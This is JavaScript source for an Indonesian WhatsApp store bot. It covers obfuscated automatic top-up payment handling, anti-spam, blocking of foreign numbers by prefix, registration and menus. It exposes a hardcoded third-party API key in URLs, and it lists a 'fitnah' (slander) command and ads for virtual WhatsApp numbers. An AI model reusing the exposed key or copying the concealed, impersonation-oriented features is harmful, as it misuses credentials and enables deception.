_0x59db28=_0x1ef6e3;if(_0x122cad[_0x59db28(0xe0)][_0x59db28(0x12b)]===!![]){data_topup[_0x59db28(0xe0)][_0x59db28(0x107)]=_0x122cad[_0x59db28(0xe0)][_0x59db28(0xe0)]['trxid'],fs[_0x59db28(0x111)](topupPath+sender[_0x59db28(0x15a)]('@')[0x0]+_0x59db28(0xfb),JSON[_0x59db28(0xec)](data_topup,null,0x3));var _0x3522fe=setInterval(function(){const _0xc117b9=_0x59db28;axios({'method':_0xc117b9(0x124),'url':_0xc117b9(0xe8),'data':qs[_0xc117b9(0xec)]({'key':setting[_0xc117b9(0x155)],'action':'status','trxid':data_topup[_0xc117b9(0xe0)]['id_produk']})})['then'](_0x316226=>{const _0x11ac59=_0xc117b9;console[_0x11ac59(0x146)](_0x316226[_0x11ac59(0xe0)]),console[_0x11ac59(0x146)](color('[CHECKING]',_0x11ac59(0x138)),_0x11ac59(0xe7)+sender);if(_0x316226[_0x11ac59(0xe0)][_0x11ac59(0xe0)][_0x11ac59(0xdc)]===_0x11ac59(0x161)){reply('*──\x20「\x20TOPUP\x20SUKSES\x20」\x20──*\x0a\x0a*Status:*\x20Success\x0a*ID\x20order:*\x20'+data_topup['ID']+_0x11ac59(0xef)+data_topup[_0x11ac59(0xe0)]['produk_topup']+_0x11ac59(0x164)+data_topup[_0x11ac59(0xe0)][_0x11ac59(0x13a)]+_0x11ac59(0x119)+_0x316226[_0x11ac59(0xe0)]['data'][_0x11ac59(0x11e)]+'\x0a\x0a_Terimakasih\x20kak\x20sudah\x20order\x20☺️_'),minSaldo(sender,Number(data_topup[_0x11ac59(0xe0)][_0x11ac59(0x100)]),db_saldo),fs[_0x11ac59(0x10c)](topupPath+sender[_0x11ac59(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x3522fe);return;}else{if(_0x316226[_0x11ac59(0xe0)][_0x11ac59(0xe0)]['status']===_0x11ac59(0x150)){reply(_0x11ac59(0x16c)+_0x316226[_0x11ac59(0xe0)]['data'][_0x11ac59(0x11e)]),fs['unlinkSync'](topupPath+sender[_0x11ac59(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x3522fe);return;}}})['catch'](_0x383281=>{const _0x42979c=_0xc117b9;reply(_0x42979c(0x165)+data_topup[_0x42979c(0xe0)][_0x42979c(0x166)]+_0x42979c(0xfc)),fs[_0x42979c(0x10c)](topupPath+sender[_0x42979c(0x15a)]('@')[0x0]+_0x42979c(0xfb)),clearInterval(_0x3522fe);return;});},0xbb8);}else{reply(_0x59db28(0x165)+data_topup[_0x59db28(0xe0)][_0x59db28(0x166)]+_0x59db28(0xfc)),fs[_0x59db28(0x10c)](topupPath+sender[_0x59db28(0x15a)]('@')[0x0]+_0x59db28(0xfb)),clearInterval(_0x3522fe);return;}});else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)]('GOPAY'))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)]['id_topup'],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})['then'](_0x5d0050=>{const _0x5d99b7=_0x1ef6e3;if(_0x5d0050[_0x5d99b7(0xe0)][_0x5d99b7(0x12b)]===!![]){data_topup[_0x5d99b7(0xe0)][_0x5d99b7(0x107)]=_0x5d0050['data']['data'][_0x5d99b7(0x137)],fs['writeFileSync'](topupPath+sender[_0x5d99b7(0x15a)]('@')[0x0]+'.json',JSON[_0x5d99b7(0xec)](data_topup,null,0x3));var _0x35ff6b=setInterval(function(){const _0x45de97=_0x5d99b7;axios({'method':'POST','url':_0x45de97(0xe8),'data':qs['stringify']({'key':setting[_0x45de97(0x155)],'action':_0x45de97(0xdc),'trxid':data_topup[_0x45de97(0xe0)]['id_produk']})})[_0x45de97(0x12a)](_0xb9f910=>{const _0x50e2ac=_0x45de97;console[_0x50e2ac(0x146)](_0xb9f910[_0x50e2ac(0xe0)]),console[_0x50e2ac(0x146)](color(_0x50e2ac(0xea),_0x50e2ac(0x138)),_0x50e2ac(0xe7)+sender);if(_0xb9f910[_0x50e2ac(0xe0)][_0x50e2ac(0xe0)][_0x50e2ac(0xdc)]===_0x50e2ac(0x161)){reply(_0x50e2ac(0xe4)+data_topup['ID']+_0x50e2ac(0xef)+data_topup['data']['produk_topup']+_0x50e2ac(0x164)+data_topup[_0x50e2ac(0xe0)][_0x50e2ac(0x13a)]+_0x50e2ac(0x119)+_0xb9f910[_0x50e2ac(0xe0)][_0x50e2ac(0xe0)][_0x50e2ac(0x11e)]+_0x50e2ac(0x149)),minSaldo(sender,Number(data_topup[_0x50e2ac(0xe0)]['harga_topup']),db_saldo),fs['unlinkSync'](topupPath+sender['split']('@')[0x0]+_0x50e2ac(0xfb)),clearInterval(_0x35ff6b);return;}else{if(_0xb9f910[_0x50e2ac(0xe0)]['data'][_0x50e2ac(0xdc)]==='error'){reply('Pesanan\x20dibatalkan!\x0aAlasan\x20:\x20'+_0xb9f910[_0x50e2ac(0xe0)][_0x50e2ac(0xe0)][_0x50e2ac(0x11e)]),fs['unlinkSync'](topupPath+sender[_0x50e2ac(0x15a)]('@')[0x0]+_0x50e2ac(0xfb)),clearInterval(_0x35ff6b);return;}}})[_0x45de97(0x10f)](_0x17fd0e=>{const _0x25ed70=_0x45de97;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup['data'][_0x25ed70(0x166)]+_0x25ed70(0xfc)),fs['unlinkSync'](topupPath+sender[_0x25ed70(0x15a)]('@')[0x0]+_0x25ed70(0xfb)),clearInterval(_0x35ff6b);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x5d99b7(0xe0)][_0x5d99b7(0x166)]+_0x5d99b7(0xfc)),fs[_0x5d99b7(0x10c)](topupPath+sender[_0x5d99b7(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x35ff6b);return;}});else{if(data_topup['data'][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('DANA'))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup['data'][_0x1ef6e3(0x166)],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x351284=>{const _0x464389=_0x1ef6e3;if(_0x351284[_0x464389(0xe0)][_0x464389(0x12b)]===!![]){data_topup[_0x464389(0xe0)][_0x464389(0x107)]=_0x351284[_0x464389(0xe0)][_0x464389(0xe0)][_0x464389(0x137)],fs[_0x464389(0x111)](topupPath+sender[_0x464389(0x15a)]('@')[0x0]+'.json',JSON[_0x464389(0xec)](data_topup,null,0x3));var _0x12e174=setInterval(function(){const _0x482e3d=_0x464389;axios({'method':'POST','url':_0x482e3d(0xe8),'data':qs[_0x482e3d(0xec)]({'key':setting[_0x482e3d(0x155)],'action':_0x482e3d(0xdc),'trxid':data_topup[_0x482e3d(0xe0)]['id_produk']})})['then'](_0x189dc3=>{const _0x2fe568=_0x482e3d;console[_0x2fe568(0x146)](_0x189dc3[_0x2fe568(0xe0)]),console[_0x2fe568(0x146)](color('[CHECKING]',_0x2fe568(0x138)),'->\x20'+sender);if(_0x189dc3[_0x2fe568(0xe0)][_0x2fe568(0xe0)][_0x2fe568(0xdc)]===_0x2fe568(0x161)){reply(_0x2fe568(0xe4)+data_topup['ID']+_0x2fe568(0xef)+data_topup['data'][_0x2fe568(0x167)]+_0x2fe568(0x164)+data_topup['data'][_0x2fe568(0x13a)]+_0x2fe568(0x119)+_0x189dc3[_0x2fe568(0xe0)][_0x2fe568(0xe0)]['message']+_0x2fe568(0x149)),minSaldo(sender,Number(data_topup[_0x2fe568(0xe0)][_0x2fe568(0x100)]),db_saldo),fs[_0x2fe568(0x10c)](topupPath+sender['split']('@')[0x0]+_0x2fe568(0xfb)),clearInterval(_0x12e174);return;}else{if(_0x189dc3[_0x2fe568(0xe0)][_0x2fe568(0xe0)][_0x2fe568(0xdc)]===_0x2fe568(0x150)){reply(_0x2fe568(0x16c)+_0x189dc3[_0x2fe568(0xe0)]['data'][_0x2fe568(0x11e)]),fs['unlinkSync'](topupPath+sender[_0x2fe568(0x15a)]('@')[0x0]+_0x2fe568(0xfb)),clearInterval(_0x12e174);return;}}})[_0x482e3d(0x10f)](_0x37188c=>{const _0x536c07=_0x482e3d;reply(_0x536c07(0x165)+data_topup['data'][_0x536c07(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x536c07(0x10c)](topupPath+sender[_0x536c07(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x12e174);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x464389(0xe0)][_0x464389(0x166)]+_0x464389(0xfc)),fs[_0x464389(0x10c)](topupPath+sender['split']('@')[0x0]+_0x464389(0xfb)),clearInterval(_0x12e174);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0x134)))axios({'method':_0x1ef6e3(0x124),'url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':'order','service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':data_topup['data'][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x5b3627=>{const _0x48fec1=_0x1ef6e3;if(_0x5b3627['data'][_0x48fec1(0x12b)]===!![]){data_topup[_0x48fec1(0xe0)][_0x48fec1(0x107)]=_0x5b3627[_0x48fec1(0xe0)]['data']['trxid'],fs[_0x48fec1(0x111)](topupPath+sender[_0x48fec1(0x15a)]('@')[0x0]+'.json',JSON[_0x48fec1(0xec)](data_topup,null,0x3));var _0x2c427a=setInterval(function(){const _0x3f9a0c=_0x48fec1;axios({'method':'POST','url':_0x3f9a0c(0xe8),'data':qs['stringify']({'key':setting['apikey_antlatic'],'action':_0x3f9a0c(0xdc),'trxid':data_topup[_0x3f9a0c(0xe0)]['id_produk']})})[_0x3f9a0c(0x12a)](_0x36066b=>{const _0x2721c8=_0x3f9a0c;console[_0x2721c8(0x146)](_0x36066b[_0x2721c8(0xe0)]),console[_0x2721c8(0x146)](color(_0x2721c8(0xea),_0x2721c8(0x138)),_0x2721c8(0xe7)+sender);if(_0x36066b[_0x2721c8(0xe0)]['data'][_0x2721c8(0xdc)]==='success'){reply(_0x2721c8(0xe4)+data_topup['ID']+_0x2721c8(0xef)+data_topup[_0x2721c8(0xe0)][_0x2721c8(0x167)]+'\x0a*No\x20Tujuan:*\x20'+data_topup[_0x2721c8(0xe0)][_0x2721c8(0x13a)]+_0x2721c8(0x119)+_0x36066b[_0x2721c8(0xe0)]['data']['message']+_0x2721c8(0x149)),minSaldo(sender,Number(data_topup[_0x2721c8(0xe0)][_0x2721c8(0x100)]),db_saldo),fs[_0x2721c8(0x10c)](topupPath+sender[_0x2721c8(0x15a)]('@')[0x0]+'.json'),clearInterval(_0x2c427a);return;}else{if(_0x36066b[_0x2721c8(0xe0)][_0x2721c8(0xe0)][_0x2721c8(0xdc)]==='error'){reply(_0x2721c8(0x16c)+_0x36066b[_0x2721c8(0xe0)]['data'][_0x2721c8(0x11e)]),fs['unlinkSync'](topupPath+sender[_0x2721c8(0x15a)]('@')[0x0]+_0x2721c8(0xfb)),clearInterval(_0x2c427a);return;}}})['catch'](_0x5405f6=>{const _0x37e5ac=_0x3f9a0c;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup[_0x37e5ac(0xe0)][_0x37e5ac(0x166)]+_0x37e5ac(0xfc)),fs[_0x37e5ac(0x10c)](topupPath+sender[_0x37e5ac(0x15a)]('@')[0x0]+_0x37e5ac(0xfb)),clearInterval(_0x2c427a);return;});},0xbb8);}else{reply(_0x48fec1(0x165)+data_topup[_0x48fec1(0xe0)][_0x48fec1(0x166)]+_0x48fec1(0xfc)),fs[_0x48fec1(0x10c)](topupPath+sender[_0x48fec1(0x15a)]('@')[0x0]+_0x48fec1(0xfb)),clearInterval(_0x2c427a);return;}});else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('FF'))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0x127),'service':data_topup['data'][_0x1ef6e3(0x166)],'target':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]})})[_0x1ef6e3(0x12a)](_0x44611d=>{const _0x21d510=_0x1ef6e3;if(_0x44611d[_0x21d510(0xe0)][_0x21d510(0x12b)]===!![]){data_topup[_0x21d510(0xe0)]['id_produk']=_0x44611d[_0x21d510(0xe0)]['data'][_0x21d510(0x137)],fs[_0x21d510(0x111)](topupPath+sender[_0x21d510(0x15a)]('@')[0x0]+_0x21d510(0xfb),JSON[_0x21d510(0xec)](data_topup,null,0x3));var _0x2243a1=setInterval(function(){const _0x5f3c66=_0x21d510;axios({'method':_0x5f3c66(0x124),'url':_0x5f3c66(0xe8),'data':qs[_0x5f3c66(0xec)]({'key':setting['apikey_antlatic'],'action':_0x5f3c66(0xdc),'trxid':data_topup['data']['id_produk']})})[_0x5f3c66(0x12a)](_0x267e7a=>{const _0x4ff07c=_0x5f3c66;console[_0x4ff07c(0x146)](_0x267e7a[_0x4ff07c(0xe0)]),console['log'](color('[CHECKING]',_0x4ff07c(0x138)),_0x4ff07c(0xe7)+sender);if(_0x267e7a[_0x4ff07c(0xe0)][_0x4ff07c(0xe0)][_0x4ff07c(0xdc)]===_0x4ff07c(0x161)){reply(_0x4ff07c(0xe4)+data_topup['ID']+_0x4ff07c(0xef)+data_topup[_0x4ff07c(0xe0)][_0x4ff07c(0x167)]+_0x4ff07c(0xe3)+data_topup[_0x4ff07c(0xe0)]['id_target']+'\x0a\x0a*SN:*\x0a'+_0x267e7a[_0x4ff07c(0xe0)][_0x4ff07c(0xe0)][_0x4ff07c(0x11e)]+_0x4ff07c(0x149)),minSaldo(sender,Number(data_topup[_0x4ff07c(0xe0)][_0x4ff07c(0x100)]),db_saldo),fs[_0x4ff07c(0x10c)](topupPath+sender['split']('@')[0x0]+_0x4ff07c(0xfb)),clearInterval(_0x2243a1);return;}else{if(_0x267e7a[_0x4ff07c(0xe0)][_0x4ff07c(0xe0)][_0x4ff07c(0xdc)]===_0x4ff07c(0x150)){reply(_0x4ff07c(0x16c)+_0x267e7a['data'][_0x4ff07c(0xe0)]['message']),fs[_0x4ff07c(0x10c)](topupPath+sender[_0x4ff07c(0x15a)]('@')[0x0]+_0x4ff07c(0xfb)),clearInterval(_0x2243a1);return;}}})[_0x5f3c66(0x10f)](_0xc33471=>{const _0x58a3fa=_0x5f3c66;reply(_0x58a3fa(0x165)+data_topup[_0x58a3fa(0xe0)][_0x58a3fa(0x166)]+_0x58a3fa(0xfc)),fs[_0x58a3fa(0x10c)](topupPath+sender['split']('@')[0x0]+_0x58a3fa(0xfb)),clearInterval(_0x2243a1);return;});},0xbb8);}else{reply(_0x21d510(0x165)+data_topup['data'][_0x21d510(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x21d510(0x10c)](topupPath+sender[_0x21d510(0x15a)]('@')[0x0]+_0x21d510(0xfb)),clearInterval(_0x2243a1);return;}});else data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes'](_0x1ef6e3(0x109))&&axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0x127),'service':data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)],'target':''+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+(''+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0xe9)])})})[_0x1ef6e3(0x12a)](_0x5e1a7c=>{const _0x12a3e8=_0x1ef6e3;if(_0x5e1a7c[_0x12a3e8(0xe0)][_0x12a3e8(0x12b)]===!![]){data_topup[_0x12a3e8(0xe0)]['id_produk']=_0x5e1a7c['data']['data'][_0x12a3e8(0x137)],fs[_0x12a3e8(0x111)](topupPath+sender[_0x12a3e8(0x15a)]('@')[0x0]+_0x12a3e8(0xfb),JSON[_0x12a3e8(0xec)](data_topup,null,0x3));var _0xefa181=setInterval(function(){const _0xb472eb=_0x12a3e8;axios({'method':_0xb472eb(0x124),'url':_0xb472eb(0xe8),'data':qs[_0xb472eb(0xec)]({'key':setting['apikey_antlatic'],'action':_0xb472eb(0xdc),'trxid':data_topup[_0xb472eb(0xe0)][_0xb472eb(0x107)]})})['then'](_0x4d914f=>{const _0x5ea511=_0xb472eb;console[_0x5ea511(0x146)](_0x4d914f[_0x5ea511(0xe0)]),console[_0x5ea511(0x146)](color(_0x5ea511(0xea),'green'),_0x5ea511(0xe7)+sender);if(_0x4d914f[_0x5ea511(0xe0)][_0x5ea511(0xe0)]['status']===_0x5ea511(0x161)){reply(_0x5ea511(0xe4)+data_topup['ID']+_0x5ea511(0xef)+data_topup['data'][_0x5ea511(0x167)]+_0x5ea511(0x15b)+data_topup['data'][_0x5ea511(0x13a)]+'\x20('+data_topup[_0x5ea511(0xe0)]['id_zone']+_0x5ea511(0x128)+_0x4d914f[_0x5ea511(0xe0)][_0x5ea511(0xe0)][_0x5ea511(0x11e)]+_0x5ea511(0x149)),minSaldo(sender,Number(data_topup[_0x5ea511(0xe0)]['harga_topup']),db_saldo),fs[_0x5ea511(0x10c)](topupPath+sender[_0x5ea511(0x15a)]('@')[0x0]+'.json'),clearInterval(_0xefa181);return;}else{if(_0x4d914f['data'][_0x5ea511(0xe0)]['status']==='error'){reply(_0x5ea511(0x16c)+_0x4d914f[_0x5ea511(0xe0)][_0x5ea511(0xe0)]['message']),fs['unlinkSync'](topupPath+sender['split']('@')[0x0]+_0x5ea511(0xfb)),clearInterval(_0xefa181);return;}}})['catch'](_0x27d39d=>{const _0x456e74=_0xb472eb;reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup['data'][_0x456e74(0x166)]+_0x456e74(0xfc)),fs['unlinkSync'](topupPath+sender['split']('@')[0x0]+_0x456e74(0xfb)),clearInterval(_0xefa181);return;});},0xbb8);}else{reply('Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*'+data_topup['data'][_0x12a3e8(0x166)]+'*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️'),fs[_0x12a3e8(0x10c)](topupPath+sender[_0x12a3e8(0x15a)]('@')[0x0]+'.json'),clearInterval(_0xefa181);return;}});}}}}}}}}}}}}}else chats['toLowerCase']()==='n'&&(reply(_0x1ef6e3(0x14f)+data_topup['ID']+_0x1ef6e3(0x13b)),fs[_0x1ef6e3(0x10c)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb)));}}}}}}if(isButton===_0x1ef6e3(0x14a)){var top_path=topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb);if(!fs[_0x1ef6e3(0x148)](top_path))return reply(_0x1ef6e3(0x120));reply(_0x1ef6e3(0x156)),fs[_0x1ef6e3(0x10c)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb));}

// Function for Anti Spam
msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
var text_ny =`mohon maaf kaka terdeteksi spam mohon tunggu 5 detik`
var tts_nya = `https://saipulanuar.ga/api/text-to-audio/tts?text=${text_ny}&idbahasa=id&apikey=jPHjZpQF`
conn.sendMessage(from, {audio:{url:tts_nya}, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
}
const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
var text_ny =`mohon maaf kaka terdeteksi spam mohon tunggu 5 detik`
var tts_nya = `https://saipulanuar.ga/api/text-to-audio/tts?text=${text_ny}&idbahasa=id&apikey=jPHjZpQF`
conn.sendMessage(from, {audio:{url:tts_nya}, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

// auto mengetik hapus tanda ini // klo mau hidupin
// await conn.sendPresenceUpdate('composing', from)

//Auto Block Nomor Luar Negeri
if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('91')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('92')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('90')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('54')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('55')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('40')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('94')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('60')) {
return conn.updateBlockStatus(sender, 'block')
}

// Console
if (isGroup && isCmd && !fromMe) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd && !fromMe) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}


// Casenya
switch(command) {
case 'daftar': case 'verify':
var yyyyygygy_xxx = 'mohon maaf sebelum nya anda sudah terdaftar'
var vvv_udah = `https://saipulanuar.ga/api/text-to-audio/tts?text=${yyyyygygy_xxx}&idbahasa=id&apikey=jPHjZpQF`
if (cekUser("id", sender) !== null) return conn.sendMessage(from, {audio:{url:vvv_udah}, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, 2, null))
mentions(`*Memuat Data* › @${sender.split("@")[0]}`, [sender])
await sleep(2000)
var verify_teks =`*───「 TERVERIFIKASI 」────*

ꔮ *Number :* @${sender.split('@')[0]}
ꔮ *Name :* ${user_name}
ꔮ *Seri :* ${res_us}
ꔮ *Saldo :* Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}

_Silahkan ketik *#menu*_
_Untuk menampilkan fitur._`
reply(verify_teks)
await sleep(2000)
var teksss_verify =`*REGISTER-USER*
• *ID:* @${sender.split('@')[0]}
• *Seri:* ${res_us}
• *Name:* ${user_name}
• *Terdaftar:* ${db_user.length}`
conn.sendMessage(`${setting.ownerNumber}`, {text:teksss_verify},{quoted:msg})
break
case 'iklan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var strip = '```'
var menu_list =`
_Utamakan chat to the point_ 🚀

*_Admin hanya melayani chat_*
*_Seputar OHLXbot & transaksi_*

${strip}Telpon & Spam blokir 🚫${strip}

_Whatsapp Admin (1) :_
_Wa.me/6285943429237_

*SELAIN DI ATAS CLONE* ‼️

*READY :*
_Jadi Bot : Rp35.000 > Tinggal Scan_
_Script Bot : Rp50.000 > Store Premium_
_Script Bot : Rp70.000 > Topup Otomatis_

*_Ready Nokos Whatsapp +1_*
*_Harga Murah? Chat Admin_*
*_Open Stok Terbatas⚠️_*

*_VIA : DANA/OVO/QRIS_*

*Minta SV? Sebut Nama 🙏*
*Admin reall ada 2 di atas !!*
`
reply(menu_list)
}
break
case 'mppenu':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const gurbot = "6285943429237@s.whatsapp.net"
mentions(`*${ucapanWaktu} ${cekUser("name", sender)}* 👋🏻

*USER INFO*
• ID : @${sender.split('@')[0]}
• Nama : ${cekUser("name", sender)}
• Saldo : Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}
• Premium : ${cekUser("premium", sender)? 'Aktif':'Tidak'}

*BOT INFO*
• BotName : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )

*TOPUP MENU*
 ▢ ${prefix}bukti
 ▢ ${prefix}topup
 ▢ ${prefix}deposit
 ▢ ${prefix}listharga

*MENU LAINNYA*
 ▢ ${prefix}daftar
 ▢ ${prefix}infome
 ▢ ${prefix}allmenu
 ▢ ${prefix}menfess

_Powered By @${gurbot.split("@")[0]}_
 `, [sender, gurbot])
}
break
case 'menu':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
const gurbot = "6285943429237@s.whatsapp.net"
var footer_nya =`_Powered By @${gurbot.split("@")[0]}_`
var menu_nya =`*──────❲ ${setting.botName} ❳──────*

╭─⬣「 *USER INFO* 」⬣
│• ID : @${sender.split('@')[0]}
│• Nama : ${cekUser("name", sender)}
│• Saldo : Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}
│• Chat : ${isGroup? 'Group':'Pribadi'}
│• Status : ${isOwner? 'Owner':'Pengguna'}
│• Premium : ${cekUser("premium", sender)? 'Aktif':'Tidak'}
╰─⬣

╭─⬣「 *BOT INFO* 」⬣
│• Library : Baileys-MD
│• Time : ${jam} WIB
│• Date : ${tanggal}
│• Prefix : ( ${prefix} )
│• Terdaftar : ( ${("id", db_user).length} )
│• Room Chat : ( ${db_menfes.length} )
╰─⬣
${readmore}
╭─⬣「 *ALL MENU BOT* 」⬣
│
│-› *_MAIN MENU_*
│${no++} ▢› ${prefix}menu
│${no++} ▢› ${prefix}iklan
│${no++} ▢› ${prefix}rules
│${no++} ▢› ${prefix}owner
│${no++} ▢› ${prefix}script
│${no++} ▢› ${prefix}infobot
│${no++} ▢› ${prefix}donasi
│${no++} ▢› ${prefix}donate
│${no++} ▢› ${prefix}sewabot
│${no++} ▢› ${prefix}groupbot
│${no++} ▢› ${prefix}ownerinfo
│${no++} ▢› ${prefix}infoowner
│
│-› *_USER MENU_*
│${no++} ▢› ${prefix}daftar
│${no++} ▢› ${prefix}report
│${no++} ▢› ${prefix}infome
│${no++} ▢› ${prefix}request
│${no++} ▢› ${prefix}transfer
│${no++} ▢› ${prefix}menfess
│${no++} ▢› ${prefix}ceksaldo
│${no++} ▢› ${prefix}cekprem
│${no++} ▢› ${prefix}daftarprem
│${no++} ▢› ${prefix}gantinama
│
│-› *_OWNER MENU_*
│${no++} ▢› ${prefix}error
│${no++} ▢› ${prefix}clearerr
│${no++} ▢› ${prefix}apikey
│${no++} ▢› ${prefix}cekip
│${no++} ▢› ${prefix}kurang 
│${no++} ▢› ${prefix}isisaldo
│${no++} ▢› ${prefix}siaran
│${no++} ▢› ${prefix}server
│${no++} ▢› ${prefix}session
│${no++} ▢› ${prefix}resetdb
│${no++} ▢› ${prefix}runtime
│${no++} ▢› ${prefix}setexif
│${no++} ▢› ${prefix}setwm
│${no++} ▢› ${prefix}setfooter
│${no++} ▢› ${prefix}setapikey
│${no++} ▢› ${prefix}setppbot
│${no++} ▢› ${prefix}addprem
│${no++} ▢› ${prefix}delprem
│${no++} ▢› ${prefix}bc
│${no++} ▢› ${prefix}bctext
│${no++} ▢› ${prefix}bcvideo
│${no++} ▢› ${prefix}bcaudio
│${no++} ▢› ${prefix}bcimage
│${no++} ▢› ${prefix}broadcast
│
│-› *_STORE MENU_*
│${no++} ▢› ${prefix}kali *1 2*
│${no++} ▢› ${prefix}bagi *1 2*
│${no++} ▢› ${prefix}kurang *1 2*
│${no++} ▢› ${prefix}tambah *1 2*
│${no++} ▢› ${prefix}dellist *key*
│${no++} ▢› ${prefix}addlist *key@response*
│${no++} ▢› ${prefix}update *key@response*
│${no++} ▢› ${prefix}done <reply orderan>
│${no++} ▢› ${prefix}proses <reply orderan>
│${no++} ▢› ${prefix}list <only group>
│${no++} ▢› ${prefix}shop <only group>
│
│-› *_GROUP MENU_*
│${no++} ▢› ${prefix}fitnah
│${no++} ▢› ${prefix}delete
│${no++} ▢› ${prefix}revoke
│${no++} ▢› ${prefix}tagall
│${no++} ▢› ${prefix}hidetag
│${no++} ▢› ${prefix}setdesc
│${no++} ▢› ${prefix}linkgrup
│${no++} ▢› ${prefix}infogroup
│${no++} ▢› ${prefix}setppgrup
│${no++} ▢› ${prefix}setnamegrup
│${no++} ▢› ${prefix}group open
│${no++} ▢› ${prefix}group close
│${no++} ▢› ${prefix}antilink on
